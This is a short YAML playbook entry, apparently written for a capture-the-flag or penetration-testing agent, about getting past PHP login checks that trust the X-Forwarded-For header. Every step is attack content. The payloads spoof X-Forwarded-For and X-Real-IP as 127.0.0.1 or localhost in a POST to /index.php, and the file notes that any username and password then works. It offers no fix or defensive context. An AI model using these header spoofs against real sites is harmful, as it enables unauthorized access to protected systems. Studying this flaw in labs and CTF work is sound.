name: php_header_injection_auth_bypass
category: web
tags: [header_injection, authentication_bypass, php, x_forwarded_for]
indicators:
  - "X-Forwarded-For header check"
  - "IP-based access control"
  - "No actual authentication"
  - "Header determines access"

tricks:
  - name: "Step 1: Identify header-based auth"
    when: "Found X-Forwarded-For check"
    how: "Check if header controls access"
    payload: |
      # PHP checks: if ($_SERVER['HTTP_X_FORWARDED_FOR'] == '127.0.0.1')

  - name: "Step 2: Set X-Forwarded-For header"
    when: "Header controls access"
    how: "Send request with required header value"
    payload: |
      X-Forwarded-For: 127.0.0.1
      # Or: X-Forwarded-For: localhost

  - name: "Step 3: Bypass authentication"
    when: "Header check passed"
    how: "Access protected resource"
    payload: |
      POST /index.php
      X-Forwarded-For: 127.0.0.1
      # Any username/password works

  - name: "Alternative: Multiple header values"
    when: "Single value doesn't work"
    how: "Try different allowed values"
    payload: |
      X-Forwarded-For: localhost
      X-Forwarded-For: 127.0.0.1
      X-Real-IP: 127.0.0.1

